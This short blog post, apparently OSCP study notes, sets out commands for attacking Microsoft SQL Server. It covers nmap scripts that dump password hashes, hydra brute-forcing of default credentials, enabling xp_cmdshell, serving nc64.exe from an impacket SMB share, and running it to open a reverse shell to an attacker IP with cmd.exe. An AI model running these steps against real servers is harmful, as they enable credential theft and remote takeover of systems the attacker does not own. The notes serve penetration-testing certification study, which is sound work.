---
layout: post
title: MSSQL OSCP
date: 2021-06-29 13:55
author: frank
comments: true
categories: [OSCP]
---
MSSQL Services

mssql-vulnerability - Nmap can be leveraged to scan MsSQL for Known vulnerabilities.

&nbsp;

Example Syntax:

&nbsp;

nmap -vv -sV -Pn -p [PORT] --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=%s,smsql.username-sa,mssql.password-sa [IP]

&nbsp;

mssql-default - Hydra can be utilized to check the MsSQL database for default credentials.

&nbsp;

Example Syntax:

&nbsp;

hydra -s [PORT] -C ./wordlists/mssql-default-userpass.txt -u -f [IP] mssql

&nbsp;

&nbsp;

Using MSSQL xp_cmdshell to get reverse shell

&nbsp;

EXEC sp_configure 'show advanced options', 1;

Reconfigure;

EXEC sp_configure 'xp_cmdshell',1

Reconfigure;

&nbsp;

&nbsp;

SQL&gt;

SQL&gt; xp_cmdshell "whoami"

output

&nbsp;

--------------------------------------------------------------------------------

&nbsp;

nt service\mssql$sqlexpress

&nbsp;

NULL

&nbsp;

&nbsp;

Start smb share

Sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .

&nbsp;

xp_cmdshell  "copy \\192.168.49.80\tools\nc64.exe c:\temp"

&nbsp;

SQL&gt; xp_cmdshell "c:\temp\nc64.exe 192.168.49.80 80 -e cmd.exe"

&nbsp;
